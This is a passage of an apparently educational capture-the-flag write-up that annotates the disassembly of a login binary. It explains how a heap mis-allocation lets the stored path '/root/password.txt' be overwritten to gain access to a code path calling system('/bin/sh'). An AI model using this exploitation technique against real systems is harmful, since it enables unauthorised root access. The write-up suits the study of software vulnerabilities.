<span class="x">0x0804885c &lt;+667&gt;:  mov    DWORD PTR [esp],0x80abc75         # &quot;/bin/sh&quot;</span>
<span class="x">0x08048863 &lt;+674&gt;:  call   0x8049860 &lt;system&gt;                # system(&quot;/bin/sh&quot;)</span>
<span class="x">0x08048868 &lt;+679&gt;:  jmp    0x80485d4 &lt;main+19&gt;</span>
<span class="x">0x0804886d &lt;+684&gt;:  mov    eax,ds:0x80ca4c0                  # STDOUT</span>
<span class="x">0x08048872 &lt;+689&gt;:  mov    DWORD PTR [esp+0xc],eax</span>
<span class="x">0x08048876 &lt;+693&gt;:  mov    DWORD PTR [esp+0x8],0x10</span>
<span class="x">0x0804887e &lt;+701&gt;:  mov    DWORD PTR [esp+0x4],0x1</span>
<span class="x">0x08048886 &lt;+709&gt;:  mov    DWORD PTR [esp],0x80abc7d         # &quot;Access Denied!\r\n&quot;</span>
<span class="x">0x0804888d &lt;+716&gt;:  call   0x804a220 &lt;fwrite&gt;                # fwrite(&quot;Access Denied!\r\n&quot;)</span>
<span class="x">0x08048892 &lt;+721&gt;:  jmp    0x80485d4 &lt;main+19&gt;</span>
<span class="x">0x08048897 &lt;+726&gt;:  nop</span>
<span class="x">0x08048898 &lt;+727&gt;:  leave</span>
<span class="x">0x08048899 &lt;+728&gt;:  ret</span>
</pre></div>
</div>
<p>The exploit comes around the usage of “auth” (080cc2c0 B auth). In response to “username”, 4 bytes are allocated and initialized to 0. The first error is that this is not big enough to hold the filename “/root/password.txt”. But that error is compounded by not using the auth pointer, but the pointer auth+32 (points to 32 bytes after auth). That’s someplace else in memory, presumably used by some other heap allocation.</p>
<div class="highlight-objdump notranslate"><div class="highlight"><pre><span></span><span class="x">0x08048711 &lt;+336&gt;:  call   0x8056d80 &lt;strncmp&gt;               # strncmp(input,&quot;username &quot;,9)</span>
<span class="x">0x08048716 &lt;+341&gt;:  test   eax,eax                           # input=&quot;username&quot;?</span>
<span class="x">0x08048718 &lt;+343&gt;:  jne    0x8048768 &lt;main+423&gt;              # no, skip to *login* check</span>
<span class="x">0x0804871a &lt;+345&gt;:  mov    DWORD PTR [esp],0x4</span>
<span class="x">0x08048721 &lt;+352&gt;:  call   0x8055550 &lt;malloc&gt;                # malloc(4)</span>
<span class="x">0x08048726 &lt;+357&gt;:  mov    ds:0x80cc2c0,eax                  # &lt;auth&gt;=malloc(4)</span>
<span class="x">0x0804872b &lt;+362&gt;:  mov    eax,ds:0x80cc2c0                  #</span>
<span class="x">0x08048730 &lt;+367&gt;:  mov    DWORD PTR [esp+0x8],0x4           # arg3=4</span>
<span class="x">0x08048738 &lt;+375&gt;:  mov    DWORD PTR [esp+0x4],0x0           # arg2=0</span>
<span class="x">0x08048740 &lt;+383&gt;:  mov    DWORD PTR [esp],eax               # arg1=&lt;auth&gt;</span>
<span class="x">0x08048743 &lt;+386&gt;:  call   0x8057cc0 &lt;memset&gt;                # memset(&lt;auth&gt;,0,4)</span>
<span class="x">0x08048748 &lt;+391&gt;:  mov    eax,ds:0x80cc2c0                  # &lt;auth&gt;</span>
<span class="x">0x0804874d &lt;+396&gt;:  add    eax,0x20                          # &lt;auth&gt;+32</span>
<span class="x">0x08048750 &lt;+399&gt;:  mov    DWORD PTR [esp+0x8],0x1f          # arg3=31</span>
<span class="x">0x08048758 &lt;+407&gt;:  mov    DWORD PTR [esp+0x4],0x80abc12     # arg2=&quot;/root/password.txt&quot;</span>
<span class="x">0x08048760 &lt;+415&gt;:  mov    DWORD PTR [esp],eax               # arg1=&lt;auth&gt;+32</span>
<span class="x">0x08048763 &lt;+418&gt;:  call   0x8056e30 &lt;strncpy&gt;               # &lt;auth&gt;+32=&quot;/root/password.txt&quot;</span>
</pre></div>
</div>
<p>So it stores the filename <code class="file docutils literal notranslate"><span class="pre">/root/password.txt</span></code> in the wrong place (auth+32), but at least is consistent when reading the filename by reading it from auth+32:</p>
<div class="highlight-objdump notranslate"><div class="highlight"><pre><span></span><span class="x">0x080486c8 &lt;+263&gt;:  mov    eax,ds:0x80cc2c0                  # arg1=&lt;auth&gt;[32:]</span>
<span class="x">0x080486cd &lt;+268&gt;:  add    eax,0x20</span>
<span class="x">0x080486d0 &lt;+271&gt;:  mov    DWORD PTR [esp],eax</span>
<span class="x">0x080486d3 &lt;+274&gt;:  call   0x80484be &lt;loadPasswordFromFile&gt;  # call loadPasswordFromFile</span>
</pre></div>
</div>
<p>So if we run “username” first, the filename is set to <code class="file docutils literal notranslate"><span class="pre">/root/password.txt</span></code>. However, the real owner of that memory can later overwrite overwrite it to some other filename, say <code class="file docutils literal notranslate"><span class="pre">/tmp/password.txt</span></code>.</p>
</div>
</div>
</div>
</div>


           </div>
           
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="de-ice6.html" class="btn btn-neutral float-right" title="3.3. De-ICE Level 6" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
      
      
        <a href="VWADP.html" class="btn btn-neutral" title="3.1. Finding and running challenges" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <p>
        &copy; Copyright 2017, bitbender.

    </p>
  </div>
  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/rtfd/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>

        </div>
      </div>

    </section>

  </div>
  


  

    <script type="text/javascript">
        var DOCUMENTATION_OPTIONS = {
            URL_ROOT:'../',
            VERSION:'1.0.3',
            LANGUAGE:'None',
            COLLAPSE_INDEX:false,
            FILE_SUFFIX:'.html',
            HAS_SOURCE:  true,
            SOURCELINK_SUFFIX: '.txt'
        };
    </script>
      <script type="text/javascript" src="../_static/jquery.js"></script>
      <script type="text/javascript" src="../_static/underscore.js"></script>
      <script type="text/javascript" src="../_static/doctools.js"></script>
      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

  

  <script type="text/javascript" src="../_static/js/theme.js"></script>

  <script type="text/javascript">
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(true);
      });
  </script> 

</body>
</html>